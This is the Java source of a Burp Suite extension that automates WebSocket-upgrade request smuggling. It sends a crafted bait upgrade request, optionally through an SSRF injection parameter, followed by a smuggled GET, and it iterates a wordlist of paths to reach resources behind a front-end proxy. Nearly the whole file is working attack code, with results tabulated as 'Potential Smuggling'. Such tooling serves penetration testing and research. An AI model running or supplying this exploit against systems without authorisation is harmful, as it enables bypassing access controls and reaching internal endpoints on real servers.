package burp;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import burp.api.montoya.ui.editor.EditorOptions;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import java.awt.*;
import java.io.*;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class WebSocketSmuggler implements BurpExtension, ContextMenuItemsProvider {

    private MontoyaApi api;
    private DefaultTableModel tableModel;
    private JTable resultsTable;
    private AtomicInteger requestIdCounter = new AtomicInteger(1);

    // Native Burp Editors
    private HttpRequestEditor requestViewer;
    private HttpResponseEditor responseViewer;

    // Storage
    private Map<Integer, AttackLog> attackHistory = new ConcurrentHashMap<>();

    // Wordlist & Target Storage
    private List<String> loadedWordlist = new ArrayList<>();
    private HttpRequestResponse targetRequest;

    // Control Flags
    private volatile boolean isRunning = false;
    private volatile boolean isPaused = false;

    // UI Input Fields
    private JCheckBox ssrfToggle;
    private JTextField simpleBaitPathField;
    private JTextField ssrfInjectionPathField;
    private JTextField ssrfServerField;
    private JTextField smuggledPathField;
    private JTextField versionField;

    // UI Buttons
    private JButton loadWordlistBtn;
    private JLabel wordlistStatusLabel;
    private JButton runWordlistBtn;
    private JButton pauseBtn;
    private JButton stopBtn;

    static class AttackLog {
        HttpRequest request;
        HttpResponse response;

        AttackLog(HttpRequest req, HttpResponse res) {
            this.request = req;
            this.response = res;
        }
    }

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        api.extension().setName("WebSocket Smuggler");

        SwingUtilities.invokeLater(() -> {
            JPanel mainPanel = new JPanel(new BorderLayout());

            // --- 1. CONFIG PANEL ---
            JPanel configPanel = new JPanel(new GridBagLayout());
            GridBagConstraints c = new GridBagConstraints();
            c.insets = new Insets(5, 5, 5, 5);
            c.fill = GridBagConstraints.HORIZONTAL;
            c.anchor = GridBagConstraints.WEST;

            // Row 0: SSRF Toggle Checkbox
            ssrfToggle = new JCheckBox("Enable SSRF-Triggered Smuggling");
            c.gridx = 0; c.gridy = 0; c.gridwidth = 2;
            configPanel.add(ssrfToggle, c);

            // --- Simple Mode Field ---
            simpleBaitPathField = new JTextField("/socket", 20);
            c.gridx = 0; c.gridy = 1; c.gridwidth = 1;
            configPanel.add(new JLabel("Simple Bait Path:"), c);
            c.gridx = 1;
            configPanel.add(simpleBaitPathField, c);

            // --- SSRF Mode Fields ---
            ssrfInjectionPathField = new JTextField("/check-url?server=", 20);
            ssrfServerField = new JTextField("http://127.0.0.1:8000", 20);

            c.gridx = 0; c.gridy = 2;
            configPanel.add(new JLabel("SSRF Injection Path:"), c);
            c.gridx = 1;
            configPanel.add(ssrfInjectionPathField, c);

            c.gridx = 0; c.gridy = 3;
            configPanel.add(new JLabel("Python Server URL:"), c);
            c.gridx = 1;
            configPanel.add(ssrfServerField, c);

            // --- Smuggled Path (Target for Wordlist) ---
            smuggledPathField = new JTextField("/robots.txt", 20);
            smuggledPathField.setToolTipText("Use {PAYLOAD} to insert wordlist item here");

            c.gridx = 0; c.gridy = 4;
            configPanel.add(new JLabel("Smuggled Path:"), c);
            c.gridx = 1;
            configPanel.add(smuggledPathField, c);

            // --- Wordlist Selection ---
            c.gridx = 0; c.gridy = 5;
            loadWordlistBtn = new JButton("Load Wordlist");
            configPanel.add(loadWordlistBtn, c);

            c.gridx = 1;
            wordlistStatusLabel = new JLabel("No wordlist loaded");
            configPanel.add(wordlistStatusLabel, c);

            loadWordlistBtn.addActionListener(e -> loadWordlist());

            // --- Version Field ---
            versionField = new JTextField("13", 5);
            c.gridx = 0; c.gridy = 6;
            configPanel.add(new JLabel("WS Version:"), c);
            c.gridx = 1;
            configPanel.add(versionField, c);

            // --- Action Buttons (Run, Pause, Stop, Clear) ---
            JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));

            JButton clearBtn = new JButton("Clear Results");
            clearBtn.addActionListener(e -> {
                tableModel.setRowCount(0);
                attackHistory.clear();
                HttpService dummy = HttpService.httpService("localhost", 80, false);
                requestViewer.setRequest(HttpRequest.httpRequest(dummy, ByteArray.byteArray("")));
                responseViewer.setResponse(HttpResponse.httpResponse(ByteArray.byteArray("")));
            });

            runWordlistBtn = new JButton("Run Attack");
            runWordlistBtn.setEnabled(false);
            runWordlistBtn.addActionListener(e -> new Thread(this::performWordlistAttack).start());

            pauseBtn = new JButton("Pause");
            pauseBtn.setEnabled(false);
            pauseBtn.addActionListener(e -> togglePause());

            stopBtn = new JButton("Stop");
            stopBtn.setEnabled(false);
            stopBtn.addActionListener(e -> stopAttack());

            buttonPanel.add(clearBtn);
            buttonPanel.add(runWordlistBtn);
            buttonPanel.add(pauseBtn);
            buttonPanel.add(stopBtn);

            c.gridx = 0; c.gridy = 7; c.gridwidth = 2;
            configPanel.add(buttonPanel, c);

            // Initial state
            toggleSSRFFields();
            ssrfToggle.addActionListener(e -> toggleSSRFFields());

            // --- 2. TABLE AND EDITORS ---
            String[] columns = {"ID", "Host", "Status", "Code 1", "Code 2", "Time"};
            tableModel = new DefaultTableModel(columns, 0) {
                @Override public boolean isCellEditable(int row, int column) { return false; }
            };
            resultsTable = new JTable(tableModel);
            resultsTable.setAutoCreateRowSorter(true);
            JScrollPane tableScroll = new JScrollPane(resultsTable);

            requestViewer = api.userInterface().createHttpRequestEditor(EditorOptions.READ_ONLY);
            responseViewer = api.userInterface().createHttpResponseEditor(EditorOptions.READ_ONLY);

            JTabbedPane reqTabs = new JTabbedPane(); reqTabs.addTab("Request", requestViewer.uiComponent());
            JTabbedPane resTabs = new JTabbedPane(); resTabs.addTab("Response", responseViewer.uiComponent());

            JSplitPane viewerSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, reqTabs, resTabs);
            viewerSplit.setResizeWeight(0.5);

            JSplitPane mainSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tableScroll, viewerSplit);
            mainSplit.setResizeWeight(0.4);

            mainPanel.add(configPanel, BorderLayout.NORTH);
            mainPanel.add(mainSplit, BorderLayout.CENTER);

            resultsTable.getSelectionModel().addListSelectionListener(e -> {
                if (!e.getValueIsAdjusting()) updateEditors();
            });

            api.userInterface().registerSuiteTab("WebSocket Smuggler", mainPanel);
        });

        api.userInterface().registerContextMenuItemsProvider(this);
        api.logging().logToOutput("WebSocket Smuggler Loaded.");
    }

    // --- Control Logic ---

    private void togglePause() {
        isPaused = !isPaused;
        pauseBtn.setText(isPaused ? "Resume" : "Pause");
        api.logging().logToOutput(isPaused ? "Attack Paused." : "Attack Resumed.");
    }

    private void stopAttack() {
        isRunning = false;
        isPaused = false;
        api.logging().logToOutput("Attack Stopped by User.");
        setAttackUIState(false);
    }

    private void setAttackUIState(boolean active) {
        SwingUtilities.invokeLater(() -> {
            runWordlistBtn.setEnabled(!active && targetRequest != null && !loadedWordlist.isEmpty());
            loadWordlistBtn.setEnabled(!active);
            ssrfToggle.setEnabled(!active);

            pauseBtn.setEnabled(active);
            stopBtn.setEnabled(active);
            pauseBtn.setText("Pause");

            if (!active) checkRunButtonState();
        });
    }

    private void loadWordlist() {
        JFileChooser chooser = new JFileChooser();
        int returnVal = chooser.showOpenDialog(null);
        if(returnVal == JFileChooser.APPROVE_OPTION) {
            File file = chooser.getSelectedFile();
            loadedWordlist.clear();
            try (BufferedReader br = new BufferedReader(new FileReader(file))) {
                String line;
                while ((line = br.readLine()) != null) {
                    if(!line.trim().isEmpty()) loadedWordlist.add(line.trim());
                }
                wordlistStatusLabel.setText("Loaded: " + file.getName() + " (" + loadedWordlist.size() + " payloads)");
                checkRunButtonState();
            } catch (IOException ex) {
                api.logging().logToError("Error loading wordlist: " + ex.getMessage());
            }
        }
    }

    private void checkRunButtonState() {
        runWordlistBtn.setEnabled(targetRequest != null && !loadedWordlist.isEmpty() && !isRunning);
    }

    private void toggleSSRFFields() {
        boolean isSSRF = ssrfToggle.isSelected();
        simpleBaitPathField.setEnabled(!isSSRF);
        ssrfInjectionPathField.setEnabled(isSSRF);
        ssrfServerField.setEnabled(isSSRF);
    }

    private void updateEditors() {
        try {
            int viewRow = resultsTable.getSelectedRow();
            if (viewRow == -1) return;
            int modelRow = resultsTable.convertRowIndexToModel(viewRow);
            int id = Integer.parseInt(tableModel.getValueAt(modelRow, 0).toString());
            AttackLog log = attackHistory.get(id);
            if (log != null) {
                requestViewer.setRequest(log.request);
                responseViewer.setResponse(log.response);
            }
        } catch (Exception ex) {}
    }

    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        List<Component> menuList = new ArrayList<>();
        JMenuItem item = new JMenuItem("Send to WebSocket Smuggler");
        item.addActionListener(e -> {
            List<HttpRequestResponse> selection = event.selectedRequestResponses();
            if (selection == null || selection.isEmpty()) return;

            this.targetRequest = selection.get(0);
            checkRunButtonState();
            api.logging().logToOutput("Target set to: " + targetRequest.httpService().host());

            // Run single probe
            new Thread(() -> performAttack(targetRequest, null)).start();
        });
        menuList.add(item);
        return menuList;
    }

    private void performWordlistAttack() {
        if (targetRequest == null || loadedWordlist.isEmpty()) return;

        isRunning = true;
        isPaused = false;
        setAttackUIState(true);

        try {
            for (String payload : loadedWordlist) {
                if (!isRunning) break;
                while (isPaused && isRunning) {
                    try { Thread.sleep(200); } catch (InterruptedException e) {}
                }
                if (!isRunning) break;

                performAttack(targetRequest, payload);

                try { Thread.sleep(50); } catch (InterruptedException e) {}
            }
        } finally {
            isRunning = false;
            isPaused = false;
            setAttackUIState(false);
            api.logging().logToOutput("Wordlist attack finished.");
        }
    }

    // --- MAIN ATTACK LOGIC ---

    private void performAttack(HttpRequestResponse baseRequest, String payloadOverride) {
        int id = requestIdCounter.getAndIncrement();
        String host = baseRequest.httpService().host();
        int port = baseRequest.httpService().port();
        boolean isSecure = baseRequest.httpService().secure();
        String timestamp = new SimpleDateFormat("HH:mm:ss").format(new Date());

        String wsVersion = versionField.getText();
        boolean useSSRF = ssrfToggle.isSelected();

        // 1. Determine Bait Path
        String baitPathForRequest;
        if (useSSRF) {
            String injectionPath = ssrfInjectionPathField.getText();
            String ssrfServer = ssrfServerField.getText();
            baitPathForRequest = injectionPath + ssrfServer;
        } else {
            baitPathForRequest = simpleBaitPathField.getText();
        }

        // 2. Determine Smuggled Path
        String rawSmuggledPath = smuggledPathField.getText();
        String finalSmuggledPath;

        if (payloadOverride != null) {
            finalSmuggledPath = rawSmuggledPath.replace("{PAYLOAD}", payloadOverride);
        } else {
            finalSmuggledPath = rawSmuggledPath.replace("{PAYLOAD}", "TEST");
        }

        SwingUtilities.invokeLater(() -> tableModel.addRow(new Object[]{id, host, "Testing...", "-", "-", timestamp}));

        try {
            String baitRequestStr =
                    "GET " + baitPathForRequest + " HTTP/1.1\r\n" +
                            "Host: " + host + ":" + port + "\r\n" +
                            "Connection: Upgrade\r\n" +
                            "Upgrade: websocket\r\n" +
                            "Sec-WebSocket-Version: " + wsVersion + "\r\n" +
                            "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n" +
                            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n" +
                            "\r\n";

            String smuggledRequestStr =
                    "GET " + finalSmuggledPath + " HTTP/1.1\r\n" +
                            "Host: " + host + ":" + port + "\r\n" +
                            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n" +
                            "\r\n";

            String fullRequestStr = baitRequestStr + smuggledRequestStr;

            Socket socket;
            if (isSecure) {
                SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();
                socket = factory.createSocket(host, port);
                ((SSLSocket)socket).startHandshake();
            } else {
                socket = new Socket(host, port);
            }
            socket.setSoTimeout(5000);

            OutputStream out = socket.getOutputStream();
            InputStream in = socket.getInputStream();

            out.write(fullRequestStr.getBytes());
            out.flush();

            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            byte[] data = new byte[4096];
            int nRead;

            try {
                while ((nRead = in.read(data, 0, data.length)) != -1) {
                    buffer.write(data, 0, nRead);
                }
            } catch (Exception timeout) {
                // Expected if socket stays open
            }
            socket.close();

            byte[] fullResponseBytes = buffer.toByteArray();

            // Analyze Response
            ResponseAnalysis analysis = analyzeResponse(fullResponseBytes);

            HttpRequest burpRequest = HttpRequest.httpRequest(baseRequest.httpService(), fullRequestStr);
            // We use the raw bytes without modification for the viewer
            HttpResponse burpResponse = HttpResponse.httpResponse(ByteArray.byteArray(fullResponseBytes));

            attackHistory.put(id, new AttackLog(burpRequest, burpResponse));

            SwingUtilities.invokeLater(() -> {
                for (int i = 0; i < tableModel.getRowCount(); i++) {
                    int rowId = Integer.parseInt(tableModel.getValueAt(i, 0).toString());
                    if (rowId == id) {
                        tableModel.setValueAt(analysis.status, i, 2);
                        tableModel.setValueAt(analysis.code1, i, 3);
                        tableModel.setValueAt(analysis.code2, i, 4);
                        if (resultsTable.getSelectedRow() != -1) updateEditors();
                        break;
                    }
                }
            });

        } catch (Exception ex) {
            SwingUtilities.invokeLater(() -> {
                for (int i = 0; i < tableModel.getRowCount(); i++) {
                    int rowId = Integer.parseInt(tableModel.getValueAt(i, 0).toString());
                    if (rowId == id) {
                        tableModel.setValueAt("Error: " + ex.getMessage(), i, 2);
                        break;
                    }
                }
            });
        }
    }

    // --- HELPER CLASS FOR ANALYSIS ---
    private static class ResponseAnalysis {
        String status;
        String code1;
        String code2;
    }

    private ResponseAnalysis analyzeResponse(byte[] rawBytes) {
        ResponseAnalysis result = new ResponseAnalysis();
        String rawString = new String(rawBytes, StandardCharsets.UTF_8);

        // Regex to find HTTP status lines (e.g., "HTTP/1.1 200 OK")
        Pattern statusPattern = Pattern.compile("HTTP/\\d\\.\\d\\s+(\\d{3})");
        Matcher matcher = statusPattern.matcher(rawString);

        List<String> codes = new ArrayList<>();
        while (matcher.find()) {
            codes.add(matcher.group(1));
        }

        result.code1 = codes.size() > 0 ? codes.get(0) : "-";
        result.code2 = codes.size() > 1 ? codes.get(1) : "-";

        if (codes.size() >= 2) {
            result.status = "Pipelining (Safe)";
        } else if (codes.size() == 1) {
            if (result.code1.equals("101")) {
                result.status = "Potential Smuggling";
            } else {
                result.status = "Single Response (" + result.code1 + ")";
            }
        } else {
            result.status = "No Response";
        }

        return result;
    }
}